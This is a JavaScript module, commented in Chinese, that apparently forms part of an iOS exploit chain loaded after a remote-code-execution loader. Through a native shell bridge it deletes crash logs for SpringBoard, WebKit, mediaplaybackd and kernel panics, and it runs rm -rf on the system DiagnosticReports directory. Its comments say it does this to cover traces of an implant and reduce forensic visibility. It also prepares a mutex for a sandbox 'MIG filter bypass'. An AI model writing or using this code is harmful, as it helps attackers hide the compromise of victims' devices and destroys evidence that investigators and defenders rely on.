/**
 * ghostknife.js — 崩溃日志清除模块
 *
 * 来源：iOS_Exploit_Code_Snippets.md snippet 15/16
 *   - GHOSTKNIFE: 删除 mediaplaybackd / SpringBoard / WebKit / panic 崩溃日志
 *   - GHOSTBLADE: 删除 DiagnosticReports 诊断目录
 *
 * 加载时机：rce_loader.js 中 native_bridge.js 之后立即执行。
 * 依赖：globalThis.nativeExecShell（由 native_bridge.js 提供）
 */
(function () {
  'use strict';

  if (typeof nativeExecShell !== 'function') return;

  /* ─────────────────── GHOSTKNIFE: CrashReporter 日志清除 ────────────────── */

  const CRASH_DIR = '/var/mobile/Library/Logs/CrashReporter/';

  /**
   * 删除与 exploit 相关的崩溃日志文件，降低取证可见性。
   * 目标模式：mediaplaybackd / SpringBoard / com.apple.WebKit.* / panic-full-*
   */
  function cleanCrashLogs() {
    try {
      // 使用固定的基础目录，避免路径注入
      const escapedDir = CRASH_DIR.replace(/'/g, "'\\''");
      const out = nativeExecShell(`ls '${escapedDir}' 2>/dev/null`);
      if (!out) return;
      const files = out.trim().split('\n');
      let removed = 0;
      for (const f of files) {
        const name = f.trim();
        if (!name) continue;
        
        // 验证文件名安全性（防止路径遍历）
        if (name.includes('/') || name.includes('..') || name.includes('\0')) {
          continue;
        }
        
        if (
          name.includes('mediaplaybackd') ||
          name.includes('SpringBoard')     ||
          name.includes('com.apple.WebKit') ||
          name.includes('panic-full-')
        ) {
          // 使用单引号包裹，并转义文件名
          const safeName = name.replace(/'/g, "'\\''");
          nativeExecShell(`rm -f '${escapedDir}${safeName}' 2>/dev/null`);
          removed++;
        }
      }
      if (typeof print === 'function' && removed > 0) {
        print('[GhostKnife] Removed ' + removed + ' crash log(s)');
      }
    } catch (e) {}
  }

  /* ─────────────────── GHOSTBLADE: DiagnosticReports 清除 ────────────────── */

  const DIAG_DIR =
    '/private/var/containers/Shared/SystemGroup/' +
    'systemgroup.com.apple.osanalytics/DiagnosticReports/';

  /**
   * 删除整个 DiagnosticReports 目录，覆盖植入体或 exploit 崩溃痕迹。
   */
  function deleteCrashReports() {
    try {
      // 使用固定的目录路径，转义单引号
      const escapedDir = DIAG_DIR.replace(/'/g, "'\\''");
      nativeExecShell(`rm -rf '${escapedDir}' 2>/dev/null`);
      if (typeof print === 'function') {
        print('[GhostBlade] Deleted DiagnosticReports dir');
      }
    } catch (e) {}
  }

  /* ─────────────────── iOS 18.4+ MIG filter bypass warm-up ──────────────── */

  /**
   * 在 iOS 18.4+ 环境下预初始化 MIG filter bypass 所需的互斥锁指针，
   * 供后续 autobox 限制绕过使用。
   *
   * 注意：实际 MigFilterBypass 逻辑由 sbx0_main_18.4.js 实现，
   * 此处仅在 Native 就绪后分配 pthread_mutex。
   */
  function initMigBypassIfNeeded(ios_version) {
    try {
      if (typeof Native === 'undefined') return;
      if (!ios_version || !Array.isArray(ios_version)) return;
      const major = ios_version[0];
      const minor = ios_version[1] || 0;
      // iOS 18.4 kernel version = 24.4
      if (major === 18 && minor >= 4) {
        const mutexPtr = Native.callSymbol('malloc', 0x100n);
        if (mutexPtr && mutexPtr !== 0n) {
          Native.callSymbol('pthread_mutex_init', mutexPtr, 0n);
          globalThis._ghostknife_mutexPtr = mutexPtr;
          if (typeof print === 'function') {
            print('[GhostKnife] MIG bypass mutex allocated at 0x' + mutexPtr.toString(16));
          }
        }
      }
    } catch (e) {}
  }

  /* ─────────────────── 主入口 ─────────────────────────────────────────────── */

  function ghostknifeInit() {
    // 清除崩溃日志（异步友好，不阻塞主流程）
    cleanCrashLogs();
    deleteCrashReports();

    // MIG bypass 预热（iOS 18.4+ 才执行）
    const ver = typeof ios_version !== 'undefined' ? ios_version : null;
    initMigBypassIfNeeded(ver);

    if (typeof print === 'function') {
      print('[GhostKnife] Forensic cleanup complete');
    }
  }

  // 挂载到 globalThis 供 rce_loader 调用
  globalThis.ghostknifeInit     = ghostknifeInit;
  globalThis.cleanCrashLogs     = cleanCrashLogs;
  globalThis.deleteCrashReports = deleteCrashReports;

  // 立即执行
  ghostknifeInit();

})();